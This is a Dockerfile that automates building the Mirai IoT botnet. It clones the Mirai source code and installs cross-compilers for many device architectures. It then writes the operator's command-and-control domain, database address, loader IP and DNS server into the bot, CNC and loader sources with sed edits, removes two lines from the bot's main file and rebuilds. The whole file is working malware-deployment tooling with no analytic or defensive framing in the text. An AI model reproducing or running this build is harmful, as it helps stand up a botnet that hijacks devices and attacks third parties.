##### build mirai bot #####

FROM ubuntu:16.04

ARG db_domain
ARG db_ip
ARG loader_domain
ARG loader_ip
ARG dns_domain

COPY ./sources.list /etc/apt/sources.list

RUN \

################################# apt install depends ########################

echo "[log] start apt-get install ..."	&&\

apt-get update	> /dev/null 	&&\
apt-get install -yq --no-install-recommends	\
				electric-fence \
				golang \
				git \
				ca-certificates	\
				wget \
				build-essential > /dev/null &&\

echo "[log] apt-get install done"	&&\

################################# download mirai ############################

echo "[log] start git clone ..."	&&\

cd 	/usr/src	&&\
git clone https://github.com/jgamblin/Mirai-Source-Code	&&\

echo "[log] git clone done"	&&\

#################################install cross compilers #####################

echo "[log] start install cross compilers ..."	&&\

mkdir /etc/xcompile	&&\
cd /etc/xcompile	&&\

wget -q	https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-armv4l.tar.bz2	&&\
wget -q	http://distro.ibiblio.org/slitaz/sources/packages/c/cross-compiler-armv6l.tar.bz2	&&\
wget -q	https://uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-armv5l.tar.bz2	&&\
wget -q	https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-i586.tar.bz2	&&\
wget -q	https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-i686.tar.bz2	&&\
wget -q	https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-m68k.tar.bz2	&&\
wget -q	https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-mips.tar.bz2	&&\
wget -q	https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-mipsel.tar.bz2	&&\
wget -q	https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-powerpc.tar.bz2	&&\
wget -q	https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-sh4.tar.bz2	&&\
wget -q	https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-sparc.tar.bz2	&&\

tar -jxf cross-compiler-armv4l.tar.bz2	&&\
tar -jxf cross-compiler-armv5l.tar.bz2 	&&\
tar -jxf cross-compiler-armv6l.tar.bz2 	&&\
tar -jxf cross-compiler-i586.tar.bz2	&&\
tar -jxf cross-compiler-i686.tar.bz2	&&\
tar -jxf cross-compiler-m68k.tar.bz2	&&\
tar -jxf cross-compiler-mips.tar.bz2	&&\
tar -jxf cross-compiler-mipsel.tar.bz2	&&\
tar -jxf cross-compiler-powerpc.tar.bz2	&&\
tar -jxf cross-compiler-sh4.tar.bz2		&&\
tar -jxf cross-compiler-sparc.tar.bz2	&&\

rm *.tar.bz2	&&\
mv cross-compiler-armv4l armv4l    &&\	
mv cross-compiler-armv5l armv5l    &&\
mv cross-compiler-armv6l armv6l    &&\
mv cross-compiler-i586 i586    &&\
mv cross-compiler-i686 i686    &&\
mv cross-compiler-m68k m68k    &&\
mv cross-compiler-mips mips    &&\
mv cross-compiler-mipsel mipsel    &&\
mv cross-compiler-powerpc powerpc  &&\
mv cross-compiler-sh4 sh4     &&\
mv cross-compiler-sparc sparc  &&\

echo "[log] cross compiler install done"	&&\

################################### set env_var #############################

echo "[log] start setting golang ..."	&&\

export GOPATH=$HOME/Documents/go 		&&\
go get github.com/go-sql-driver/mysql	&&\
go get github.com/mattn/go-shellwords	&&\

echo "[log] golang config done"			&&\

################################### build #############################

echo "[log] start building mirai ..."		&&\

cd 		/usr/src/Mirai-Source-Code/mirai/ 	&&\
mkdir 	debug					&&\	
./build.sh debug telnet			&&\

echo "[log] mirai build done"	&&\

################################### enc ####################################

echo "[log] start enc ..."	&&\

temp1=$(./debug/enc string ${db_domain})			&&\
temp2=$(./debug/enc string ${loader_domain} )		&&\
enc_db_domain=$(echo ${temp1} | awk -v FS=' ' 'BEGIN{ ORS="" }''{print$6}' | sed 's/\\/\\\\/g;' )	&&\	
enc_loader_domain=$(echo ${temp2} | awk -v FS=' ' '{print$6}' | sed 's/\\/\\\\/g;' )	&&\

sed -i "18c add_entry(TABLE_CNC_DOMAIN, \"$enc_db_domain\", 30);" ./bot/table.c &&\
sed -i "21c add_entry(TABLE_SCAN_CB_DOMAIN, \"$enc_loader_domain\", 29);" ./bot/table.c &&\
sed -i "10c const DatabaseAddr string   = \"$db_ip:3306\"" ./cnc/main.go	&&\
sed -i  "8c #define HTTP_SERVER utils_inet_addr($loader_ip) " /usr/src/Mirai-Source-Code/dlr/main.c	&&\
sed -i "37c addrs[0] = inet_addr(\"$loader_ip\");" /usr/src/Mirai-Source-Code/loader/src/main.c	&&\
sed -i "38c addrs[1] = inet_addr(\"$loader_ip\");" /usr/src/Mirai-Source-Code/loader/src/main.c &&\
sed -i "53c     if ((srv = server_create(sysconf(_SC_NPROCESSORS_ONLN), addrs_len, addrs, 1024 * 64, \"$loader_ip\", 80, \"$loader_ip\")) == NULL)" /usr/src/Mirai-Source-Code/loader/src/main.c &&\
sed -i "158d" ./bot/main.c	&&\
sed -i "161d" ./bot/main.c	&&\
sed -i "84c 	addr.sin_addr.s_addr = INET_ADDR($dns_domain);" ./bot/resolv.c	&&\

./build.sh debug telnet	&&\

echo "[log] finish enc"	&&\

################################ clean up ##############################

rm -r $GOPATH 	&&\

apt-get purge -y electric-fence \
				golang \
				git \
				ca-certificates	\
				wget \
				build-essential > /dev/null &&\

apt-get -y clean > /dev/null		&&\
apt-get -y autoremove > /dev/null	&&\
echo "[log] Mirai-bot build done "
	
